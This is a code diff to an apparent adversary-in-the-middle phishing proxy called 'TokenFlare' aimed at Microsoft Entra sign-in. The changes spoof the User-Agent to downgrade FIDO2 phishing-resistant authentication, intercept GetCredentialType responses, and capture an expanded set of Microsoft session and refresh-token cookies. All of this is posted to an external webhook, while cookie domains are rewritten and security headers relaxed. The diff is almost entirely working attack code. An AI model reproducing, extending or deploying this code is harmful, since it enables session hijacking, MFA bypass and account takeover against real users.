@@ -63,7 +63,14 @@ export default {
       }).catch(() => {});
     }
 
-    // 5) Proxy to upstream
+    // 5) FIDO2 downgrade: spoof UA to Safari/Windows (seen as FIDO2-incompatible by Entra)
+    if (env.FIDO2_DOWNGRADE === 'true') {
+      proxyHeaders.set('User-Agent',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15');
+      log.info('FIDO2 downgrade: spoofed User-Agent for upstream request');
+    }
+
+    // 6) Proxy to upstream
     const upstreamResp = await fetch(upstreamUrl.toString(), {
       method: request.method,
       headers: proxyHeaders,
@@ -74,7 +81,27 @@ export default {
     // WS upgrades pass straight through
     if (isWebSocketUpgrade(proxyHeaders)) return upstreamResp;
 
-    // 6) Build downstream response
+    // 7) GetCredentialType intercept: send auth method intel to webhook
+    if (cfg.webhookUrl && upstreamUrl.toString().includes('/GetCredentialType')) {
+      try {
+        const gctBody = await upstreamResp.clone().text();
+        fetch(cfg.webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            source: 'TokenFlare',
+            type: 'credential_type_intel',
+            timestamp: new Date().toISOString(),
+            data: gctBody,
+          }),
+        }).catch(() => {});
+        log.info('GetCredentialType response intercepted and sent to webhook');
+      } catch (e) {
+        // Ignore parse errors — non-blocking
+      }
+    }
+
+    // 8) Build downstream response
     let outHeaders = relaxSecurityHeaders(upstreamResp.headers);
 
     let locationHeader;
@@ -102,25 +129,40 @@ export default {
         }
     }
 
-    // 7) Cookie capture - notify on auth cookies
+    // 9) Cookie capture - notify on auth cookies (expanded set)
+    const authCookieNames = new Set([
+      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
+      'SignInStateCookie', 'AADSSO', 'SSOCOOKIE',
+      'x-ms-RefreshTokenCredential',
+      'ch',           // Proof of Possession hash
+      'esctx',        // CSRF binding token
+      'buid',         // Browser unique ID
+      'fpc',          // First party cookie
+      'stsservicecookie',
+      'wlidp',
+    ]);
+
     const cookiesSet = getSetCookies(outHeaders);
+    const capturedCookies = [];
     for (const cookie of cookiesSet) {
-      if (cookie.includes('ESTSAUTH=')) {
-        for (const secondCookie of cookiesSet) {
-          if (secondCookie.includes('ESTSAUTHPERSISTENT=')) {
-            await notifyCookies(cfg.webhookUrl, cookie + '\n\n' + secondCookie, log).catch(console.error);
-          }
-        }
+      const eqIdx = cookie.indexOf('=');
+      if (eqIdx === -1) continue;
+      const name = cookie.substring(0, eqIdx).trim();
+      if (authCookieNames.has(name)) {
+        capturedCookies.push(cookie);
       }
     }
+    if (capturedCookies.length > 0) {
+      await notifyCookies(cfg.webhookUrl, capturedCookies.join('\n\n'), log).catch(console.error);
+    }
 
-    // 8) Rewrite Set-Cookie domains
+    // 10) Rewrite Set-Cookie domains
     const cookieRewrite = rewriteSetCookieDomains(outHeaders, cfg.replaceHostRegex, clientUrl.hostname);
     if (cookieRewrite) {
       outHeaders = relaxSecurityHeaders(cookieRewrite.headers);
     }
 
-    // 9) Rewrite body hostnames if textual
+    // 11) Rewrite body hostnames if textual
     const contentType = outHeaders.get('content-type') || '';
     const body = await maybeRewriteBody(upstreamResp, contentType, cfg.replaceHostRegex, clientUrl.hostname);
 
@@ -414,7 +456,13 @@ async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, raw
   // 1. Human-readable notification via existing pipeline
   await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${rawUrl}`, log);
 
-  // 2. Extract ESTS cookies from the upstream response Set-Cookie headers
+  // 2. Extract auth cookies from the upstream response Set-Cookie headers (expanded set)
+  const structuredAuthCookies = new Set([
+    'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
+    'SignInStateCookie', 'AADSSO', 'SSOCOOKIE',
+    'x-ms-RefreshTokenCredential',
+    'ch', 'esctx', 'buid', 'fpc', 'stsservicecookie', 'wlidp',
+  ]);
   const cookies = [];
   const setCookieHeaders = getSetCookies(upstreamResp.headers);
   for (const header of setCookieHeaders) {
@@ -425,7 +473,7 @@ async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, raw
     const name = nameValue.substring(0, eqIdx).trim();
     const value = nameValue.substring(eqIdx + 1).trim();
 
-    if (name === 'ESTSAUTH' || name === 'ESTSAUTHPERSISTENT') {
+    if (structuredAuthCookies.has(name)) {
       cookies.push({
         name: name,
         value: value,
